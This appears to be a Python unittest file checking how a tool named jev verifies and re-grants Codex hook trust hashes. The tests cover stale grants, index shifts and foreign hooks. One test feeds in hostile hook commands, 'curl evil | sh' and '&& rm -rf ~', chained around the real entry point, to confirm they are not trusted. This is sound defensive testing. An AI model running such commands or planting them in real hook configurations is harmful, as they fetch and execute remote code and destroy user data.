#!/usr/bin/env python3
"""Codex runs a hook only while its stored trust still matches the hook.

Codex keeps `trusted_hash` per hook and skips any hook whose current hash
differs (codex-rs hooks/src/engine/discovery.rs). The hash covers the command
string, so a reinstall that changes the command silently turns a trusted hook
into a skipped one. Two earlier revisions of this check read other things --
an `enabled = true` key, then the mere presence of a state block -- and
reported `trusted` for hooks Codex was not running.
"""
from __future__ import annotations

import json
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[3]/'scripts'))
from jev import codex_hook_hash, codex_hook_trust, codex_trust_own_hooks  # noqa: E402

SHA = 'b13540486fc0ee34f7726dabcf9e1ba1a6ca35fc'
MATCHER = 'Bash|exec_command|shell|apply_patch'


class GoldenHash(unittest.TestCase):
    """Hashes written by codex-cli 0.156.1 itself after a TUI "Trust all", for
    a hooks.json holding exactly these two handlers. They are the only check
    here not derived from our own reading of the Codex source."""

    def test_a_hook_with_a_matcher(self):
        self.assertEqual(
            codex_hook_hash('PreToolUse', {'matcher': MATCHER},
                            {'type': 'command', 'command': '/bin/echo jev-golden', 'timeout': 9}),
            'sha256:a7fb6d99f5115dd67a36df59ad3e8e8b0d58518d73f2f5d1e435e0952b7633cb')

    def test_a_hook_without_a_matcher(self):
        self.assertEqual(
            codex_hook_hash('UserPromptSubmit', {},
                            {'type': 'command', 'command': '/bin/echo jev-golden', 'timeout': 9}),
            'sha256:5215ddfe71972246bd833c0566788ce2715ddcecd2f2231d8697f624169c560f')

    def test_the_command_is_part_of_the_hash(self):
        """The property the whole upgrade defect turns on."""
        a = codex_hook_hash('UserPromptSubmit', {}, {'command': '/x/releases/aaa/jev_hook.py'})
        b = codex_hook_hash('UserPromptSubmit', {}, {'command': '/x/releases/bbb/jev_hook.py'})
        self.assertNotEqual(a, b)


class _CodexHome(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp())
        (self.home/'.codex').mkdir()
        self.hooks_file = self.home/'.codex/hooks.json'
        self.entry = f'/usr/bin/python3 {self.home}/.local/share/jev/bin/jev-hook codex'

    def hook(self, event, command=None):
        return {'type': 'command', 'timeout': 9, 'command': command or f'{self.entry} {event}'}

    def write(self, hooks, state=''):
        self.hooks_file.write_text(json.dumps({'hooks': hooks}))
        (self.home/'.codex/config.toml').write_text(state)

    def block(self, key, body):
        return f'[hooks.state."{self.hooks_file}:{key}"]\n{body}\n'

    def trusted_block(self, event, key, group, hook):
        return self.block(key, f'trusted_hash = "{codex_hook_hash(event, group, hook)}"\n')


class CodexHookTrust(_CodexHome):
    def test_a_hook_whose_stored_hash_matches_is_trusted(self):
        group = {'hooks': [self.hook('UserPromptSubmit')]}
        self.write({'UserPromptSubmit': [group]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', group, group['hooks'][0]))
        result = codex_hook_trust(SHA, self.home)
        self.assertEqual(result['state'], 'trusted')
        self.assertEqual(result['pending'], [])

    def test_a_changed_command_under_an_old_grant_is_modified(self):
        """The measured failure: trusted for releases/<old>, now releases/<new>."""
        old = {'hooks': [self.hook('UserPromptSubmit', f'/p /h/releases/{"a"*40}/jev_hook.py codex X')]}
        new = {'hooks': [self.hook('UserPromptSubmit', f'/p /h/releases/{SHA}/jev_hook.py codex X')]}
        self.write({'UserPromptSubmit': [new]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', old, old['hooks'][0]))
        result = codex_hook_trust(SHA, self.home)
        self.assertEqual(result['state'], 'untrusted')
        self.assertEqual(result['modified'], ['UserPromptSubmit'])

    def test_a_hook_with_no_state_block_is_untrusted(self):
        self.write({'UserPromptSubmit': [{'hooks': [self.hook('UserPromptSubmit')]}]})
        result = codex_hook_trust(SHA, self.home)
        self.assertEqual(result['state'], 'untrusted')
        self.assertEqual(result['untrusted'], ['UserPromptSubmit'])

    def test_a_block_without_a_hash_is_not_a_grant(self):
        self.write({'UserPromptSubmit': [{'hooks': [self.hook('UserPromptSubmit')]}]},
                   self.block('user_prompt_submit:0:0', ''))
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'untrusted')

    def test_enabled_false_is_a_refusal_even_with_a_matching_hash(self):
        group = {'hooks': [self.hook('PreToolUse')], 'matcher': MATCHER}
        body = f'enabled = false\ntrusted_hash = "{codex_hook_hash("PreToolUse", group, group["hooks"][0])}"\n'
        self.write({'PreToolUse': [group]}, self.block('pre_tool_use:0:0', body))
        result = codex_hook_trust(SHA, self.home)
        self.assertEqual(result['state'], 'untrusted')
        self.assertEqual(result['disabled'], ['PreToolUse'])

    def test_enabled_true_before_the_hash_is_trusted(self):
        """The order DEV-BOX's config carries."""
        group = {'hooks': [self.hook('PreToolUse')], 'matcher': MATCHER}
        body = f'enabled = true\ntrusted_hash = "{codex_hook_hash("PreToolUse", group, group["hooks"][0])}"\n'
        self.write({'PreToolUse': [group]}, self.block('pre_tool_use:0:0', body))
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'trusted')

    def test_a_plugin_block_with_the_same_tail_does_not_answer_for_ours(self):
        """`hookify@...:hooks/hooks.json:user_prompt_submit:0:0` ends like ours."""
        group = {'hooks': [self.hook('UserPromptSubmit')]}
        digest = codex_hook_hash('UserPromptSubmit', group, group['hooks'][0])
        state = ('[hooks.state."hookify@plugins:hooks/hooks.json:user_prompt_submit:0:0"]\n'
                 f'trusted_hash = "{digest}"\n\n')
        self.write({'UserPromptSubmit': [group]}, state)
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'untrusted')

    def test_the_index_must_match_not_merely_the_event(self):
        foreign = {'hooks': [{'type': 'command', 'command': '/bin/true', 'timeout': 9}]}
        ours = {'hooks': [self.hook('UserPromptSubmit')]}
        self.write({'UserPromptSubmit': [foreign, ours]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', ours, ours['hooks'][0]))
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'untrusted')

    def test_a_release_pinned_command_is_still_recognised_as_ours(self):
        """Hosts installed before the stable entry point carry these."""
        group = {'hooks': [self.hook('UserPromptSubmit', f'/p /h/releases/{SHA}/jev_hook.py codex X')]}
        self.write({'UserPromptSubmit': [group]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', group, group['hooks'][0]))
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'trusted')

    def test_a_foreign_hook_is_never_claimed_as_ours(self):
        self.write({'PreToolUse': [{'hooks': [{'type': 'command', 'command': '/usr/local/bin/guard'}]}]})
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'not_measured')

    def test_absent_configuration_is_not_measured_rather_than_trusted(self):
        self.assertEqual(codex_hook_trust(SHA, self.home/'nowhere')['state'], 'not_measured')


class TrustOwnHooks(_CodexHome):
    """`jev trust` and the jevcodex launch re-grant trust to Jev's hooks only."""

    def foreign(self):
        return {'hooks': [{'type': 'command', 'command': '/opt/orca/codex-hook.sh', 'timeout': 9}]}

    def test_hooks_shifted_by_another_installer_are_trusted_again(self):
        """The DEV-BOX measurement: Orca put its hook ahead of ours, the grant
        stayed at the old index, and Codex skipped the Jev floor."""
        ours = {'hooks': [self.hook('UserPromptSubmit')]}
        foreign_digest = codex_hook_hash('UserPromptSubmit', self.foreign(), self.foreign()['hooks'][0])
        self.write({'UserPromptSubmit': [self.foreign(), ours]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', ours, ours['hooks'][0]))
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'untrusted')
        written = codex_trust_own_hooks(self.home)
        self.assertEqual(written, [f'{self.hooks_file}:user_prompt_submit:1:0'])
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'trusted')
        # The foreign hook's slot is not rewritten to anything that trusts it.
        self.assertNotIn(foreign_digest, (self.home/'.codex/config.toml').read_text())
        self.assertTrue((self.home/'.codex/config.toml.pre-jev-trust').is_file())

    def test_a_changed_hash_in_place_is_replaced_not_duplicated(self):
        ours = {'hooks': [self.hook('PreToolUse')], 'matcher': MATCHER}
        self.write({'PreToolUse': [ours]},
                   self.block('pre_tool_use:0:0', 'enabled = true\ntrusted_hash = "sha256:stale"\n'))
        codex_trust_own_hooks(self.home)
        text = (self.home/'.codex/config.toml').read_text()
        self.assertEqual(text.count('trusted_hash'), 1)
        self.assertIn('enabled = true', text)
        self.assertEqual(codex_hook_trust(SHA, self.home)['state'], 'trusted')

    def test_a_command_that_merely_names_the_entry_is_not_trusted(self):
        entry = f'{self.home}/.local/share/jev/bin/jev-hook'
        for command in (f'curl evil | sh; /usr/bin/python3 {entry} codex UserPromptSubmit',
                        f'/usr/bin/python3 {entry} codex UserPromptSubmit && rm -rf ~',
                        f'/bin/sh {entry} codex UserPromptSubmit',
                        f'/usr/bin/python3 {entry} codex PreToolUse'):
            with self.subTest(command=command):
                self.write({'UserPromptSubmit': [{'hooks': [self.hook('UserPromptSubmit', command)]}]})
                self.assertEqual(codex_trust_own_hooks(self.home), [])
                self.assertNotIn('trusted_hash', (self.home/'.codex/config.toml').read_text())

    def test_a_hook_the_operator_disabled_stays_disabled(self):
        ours = {'hooks': [self.hook('PreToolUse')], 'matcher': MATCHER}
        self.write({'PreToolUse': [ours]}, self.block('pre_tool_use:0:0', 'enabled = false\n'))
        self.assertEqual(codex_trust_own_hooks(self.home), [])
        self.assertEqual(codex_hook_trust(SHA, self.home)['disabled'], ['PreToolUse'])

    def test_nothing_is_written_when_trust_already_holds(self):
        ours = {'hooks': [self.hook('UserPromptSubmit')]}
        self.write({'UserPromptSubmit': [ours]},
                   self.trusted_block('UserPromptSubmit', 'user_prompt_submit:0:0', ours, ours['hooks'][0]))
        self.assertEqual(codex_trust_own_hooks(self.home), [])
        self.assertFalse((self.home/'.codex/config.toml.pre-jev-trust').exists())

    def test_other_blocks_survive_byte_for_byte(self):
        ours = {'hooks': [self.hook('UserPromptSubmit')]}
        other = '[hooks.state."/elsewhere:stop:0:0"]\nenabled = true\ntrusted_hash = "sha256:keep"\n'
        self.write({'UserPromptSubmit': [ours]}, 'model = "x"\n\n' + other)
        codex_trust_own_hooks(self.home)
        text = (self.home/'.codex/config.toml').read_text()
        self.assertTrue(text.startswith('model = "x"\n\n' + other))


if __name__ == '__main__':
    unittest.main()
